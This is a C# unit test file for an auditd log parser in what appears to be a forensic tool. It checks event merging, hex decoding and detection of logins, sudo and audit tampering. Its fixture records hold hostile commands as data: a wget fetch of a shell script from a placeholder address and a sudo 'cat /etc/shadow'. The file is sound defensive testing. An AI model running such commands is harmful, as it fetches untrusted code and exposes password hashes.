using ArtefactForge.Core.Linux;

namespace ArtefactForge.Tests;

/// <summary>
/// auditd's log. The lines follow audit-userspace's record format exactly (several records per
/// event joined by msg=audit(epoch:serial), hex for untrusted strings, user records inside
/// msg='...', the ENRICHED 0x1D suffix); hosts, users and addresses are made up.
/// </summary>
public class AuditTests
{
    private const string Exec =
        "type=SYSCALL msg=audit(1760176800.123:4501): arch=c000003e syscall=59 success=yes exit=0 a0=55d1c8a0 a1=55d1c8b0 a2=55d1c8c0 a3=0 items=2 ppid=812 pid=4242 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=3 comm=\"wget\" exe=\"/usr/bin/wget\" subj=unconfined key=\"exec\"\n" +
        "type=EXECVE msg=audit(1760176800.123:4501): argc=3 a0=\"wget\" a1=\"-q\" a2=687474703A2F2F3139382E35312E3130302E372F782E7368\n" +
        "type=CWD msg=audit(1760176800.123:4501): cwd=\"/tmp\"\n" +
        "type=PATH msg=audit(1760176800.123:4501): item=0 name=\"/usr/bin/wget\" inode=1234 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL\n" +
        "type=PROCTITLE msg=audit(1760176800.123:4501): proctitle=77676574002D71\n";

    private const string UserRecords =
        "type=USER_AUTH msg=audit(1760176900.000:4510): pid=900 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=? acct=\"alice\" exe=\"/usr/sbin/sshd\" hostname=198.51.100.7 addr=198.51.100.7 terminal=ssh res=failed'\n" +
        "type=USER_CMD msg=audit(1760177000.000:4520): pid=5000 uid=1000 auid=1000 ses=3 msg='cwd=\"/home/alice\" cmd=636174202F6574632F736861646F77 exe=\"/usr/bin/sudo\" terminal=pts/0 res=success'\n" +
        "type=CONFIG_CHANGE msg=audit(1760177100.000:4530): auid=1000 ses=3 op=remove_rule key=\"exec\" list=4 res=1\n" +
        "type=DAEMON_END msg=audit(1760177200.000:4540): op=terminate auid=0 pid=1 subj=unconfined res=success\n";

    private static (string Out, string Errors) Run(TempDirectory dir, params (string Name, string Text)[] logs)
    {
        File.WriteAllText(dir.File(Path.Combine("root", "etc", "passwd")),
            "root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n");
        foreach (var (name, text) in logs)
            File.WriteAllText(dir.File(Path.Combine("root", "var", "log", "audit", name)), text);

        var output = Path.Combine(dir.Path, "out");
        using var log = new StringWriter();
        using var errors = new StringWriter();
        Assert.Equal(0, AuditExport.Run(Path.Combine(dir.Path, "root"), output, log, errors, CancellationToken.None));
        return (output, errors.ToString());
    }

    [Fact]
    public void An_events_records_are_merged_and_its_command_line_decoded()
    {
        using var dir = new TempDirectory();
        var (output, errors) = Run(dir, ("audit.log", Exec));

        Assert.Equal("", errors);
        var e = Assert.Single(CsvReader.Read(Path.Combine(output, "LinuxAudit_Events.csv")));
        Assert.Equal("2025-10-11 10:00:00.123", e["TimestampUtc"]);
        Assert.Equal("1760176800.123:4501", e["EventId"]);
        Assert.Equal("SYSCALL,EXECVE,CWD,PATH,PROCTITLE", e["RecordTypes"]);
        Assert.Equal("execve (59)", e["Syscall"]);
        Assert.Equal("wget -q http://198.51.100.7/x.sh", e["CommandLine"]);
        Assert.Equal("alice (1000)", e["AuditUser"]);
        Assert.Equal("root (0)", e["User"]);
        Assert.Equal(("/tmp", "/usr/bin/wget", "exec", "pts0"), (e["Cwd"], e["Paths"], e["Key"], e["Terminal"]));
    }

    [Fact]
    public void Logins_sudo_and_tampering_with_audit_are_key_events()
    {
        using var dir = new TempDirectory();
        var (output, errors) = Run(dir, ("audit.log", Exec + UserRecords));

        Assert.Equal("", errors);
        var keys = CsvReader.Read(Path.Combine(output, "LinuxAudit_KeyEvents.csv"));
        Assert.Equal(["Authentication failed", "sudo command", "Audit rules changed", "Audit daemon stopped"],
                     keys.Select(k => k["Event"]));
        Assert.Equal(("alice", "198.51.100.7", "(unset)"), (keys[0]["Account"], keys[0]["Address"], keys[0]["AuditUser"]));
        Assert.Equal("cat /etc/shadow", keys[1]["Detail"]);
        Assert.Contains("remove_rule", keys[2]["Detail"]);
    }

    [Fact]
    public void Rotated_logs_are_read_oldest_first()
    {
        using var dir = new TempDirectory();
        var (output, _) = Run(dir, ("audit.log", UserRecords), ("audit.log.1", Exec));

        var events = CsvReader.Read(Path.Combine(output, "LinuxAudit_Events.csv"));
        Assert.Equal("var/log/audit/audit.log.1", events[0]["SourceFile"]);
        Assert.Equal("var/log/audit/audit.log", events[^1]["SourceFile"]);
    }

    [Fact]
    public void Names_auditd_resolved_in_the_enriched_format_are_used()
    {
        using var dir = new TempDirectory();
        var line = "type=USER_LOGIN msg=audit(1760176900.000:4511): pid=901 uid=0 auid=1001 ses=5 msg='op=login id=1001 exe=\"/usr/sbin/sshd\" hostname=? addr=198.51.100.8 terminal=/dev/pts/1 res=success'"
                   + "\x1dUID=\"root\" AUID=\"bob\" ID=\"bob\"\n";
        var (output, _) = Run(dir, ("audit.log", line));

        var e = Assert.Single(CsvReader.Read(Path.Combine(output, "LinuxAudit_Events.csv")));
        Assert.Equal("bob (1001)", e["AuditUser"]);
    }

    [Fact]
    public void Without_an_execve_record_the_command_line_comes_from_proctitle()
    {
        using var dir = new TempDirectory();
        var lines = Exec.Split('\n');
        var (output, _) = Run(dir, ("audit.log", lines[0] + "\n" + lines[4] + "\n"));

        var e = Assert.Single(CsvReader.Read(Path.Combine(output, "LinuxAudit_Events.csv")));
        Assert.Equal("wget -q", e["CommandLine"]);
    }

    [Fact]
    public void A_line_that_is_not_an_audit_record_is_reported()
    {
        using var dir = new TempDirectory();
        var (_, errors) = Run(dir, ("audit.log", Exec + "this is not an audit line\n"));

        Assert.Contains("1 line(s) not in auditd's", errors);
    }
}
